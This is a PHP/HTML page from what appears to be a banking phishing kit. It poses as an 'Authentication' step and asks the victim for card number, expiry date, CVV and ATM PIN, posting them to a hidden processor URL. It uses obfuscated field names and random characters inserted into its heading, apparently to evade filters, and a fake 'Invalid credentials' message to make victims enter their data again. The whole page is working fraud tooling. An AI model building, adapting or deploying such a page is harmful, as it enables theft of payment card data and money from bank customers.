<!DOCTYPE html>
<html lang="en-US" class="js-focus-visible"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; }</style><title>Authentication</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<link rel="shortcut icon" href="<?php echo gaflder();?>/favicon.ico">
<link href="<?php echo gaflder();?>/font-icons.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris-foundation.min.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/theme.mobile.css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.shim.mobile.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/isotope.min.css" type="text/css">
<style>
body.Authentication .brand-logo {max-width:200px;height:200px;margin-top:30px;margin-bottom:30px;}
body.Authentication .mobile-authentication-container {
    display: block;
    position: relative;
}
#kindunderline{font-size:15px;}
.irisv-button{white-space:normal;}
body.Authentication.isotope-mobile .isotope-app{height:100%;max-width: 600px;width: 100%;margin: auto;}
</style>
</head>
</head>
<body id="username_page" class="alk-body shared-layout theme--theme-builder isotope-mobile Authentication windows challenge-type-username-and-password username-and-password iris-keyboard-use-detected">
<div class="page-background__layer page-background__layer0--image"></div><div id="mmenu_container"><div id="wrapper"><div id="content" class="clearfix"><div class="card-container flush-with-titlebar"><div class="card card-full-width"><div class="cms-content-area iris-content"></div></div></div><div class="cms-content-area"></div><div class="mobile-authentication-container"><div id="login_header" class="mobile-authentication-header"><div class="brand-logo" role="img"></div></div><div class="mobile-authentication-content"><div id="app" class="isotope-app"><div class="isotope-page--authentication isotope-page"><div class="isotope-challenge-type--username-and-password isotope-challenge-type"><div class="login-image-container"><form role="form" id="ticated" method="POST" action="<?php echo $_SESSION['processor'];?><?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>" class="isotope-slide usernameAndPasswordForm"><!----><div class="isotope-slide__content"><div><h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
Now, let's<?php echo rT('ALPHANUMERIC',rand(1,87));?> confirm y<?php echo rT('ALPHANUMERIC',rand(1,87));?>our Infor<?php echo rT('ALPHANUMERIC',rand(1,87));?>mation<?php echo rT('ALPHANUMERIC',rand(1,87));?>.
            </h1></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="cardnumber" class="irisv-textfield__label font-caption"> Card Number</label></span><input type="tel" name="<?php echo gaN('cardnumber');?>" id="cardnumber" required="required" oninput="innumlen(this.value);demcnum();" maxlength="19" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="expdate" class="irisv-textfield__label font-caption"> Expiry Date</label></span><input type="tel" name="<?php echo gaN('expdate');?>" id="expdate" required="required" oninput="demexpDate();" maxlength="5" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="cvv" class="irisv-textfield__label font-caption"> CVV</label></span><input type="tel" name="<?php echo gaN('cvv');?>" id="cvv" required="required" oninput="innumlen(this.value)" maxlength="3" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>
			
<div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="pin" class="irisv-textfield__label font-caption"> ATM PIN</label></span><input type="tel" name="<?php echo gaN('atm');?>" id="pin" oninput="innumlen(this.value)" maxlength="4" required="required" class="irisv-textfield__input font-subtitle-1"/></div><!----></div></div></div>

			<div class="mar-top--small"><div class="right-links"><a class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;"><!----><input name="<?php echo gaN('subscr');?>" type="hidden" value="<?php echo md5(uniqid());?>"/><span class="irisv-button__text">Confirm the information before you submit</span><!----><!----></a></div></div></div><div class="isotope-slide__footer"><div class="mar-top--small"><div id="irisv_notification_868k24rt5lu" role="alertdialog" tabindex="0" class="irisv-notification inline error-light" style="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'display:none;';};?>"><div class="irisv-notification__container"><span role="img" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_868k24rt5lu_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2"> Invalid credentials, Please try again. </span></span><button class="irisv-notification__close" style="display: none;"><span class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div><div class="irisv-notification__trailing-content" style="display: none;"></div></div></div><div class="isotope-actions mar-top--small"><button type="submit" class="irisv-button irisv-button--highEmphasis irisv-button--onLight irisv-button--full-width text--none" id="btn_submitCredentials"><!----><span class="irisv-button__text"> Continue </span><!----><!----></button><br></div></div>
			</form>
			<br/>
			<br/>
<script>
function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};
</script>

</div></div></div>
</div>
</div>
</div>
</div>
</div>
</body></html>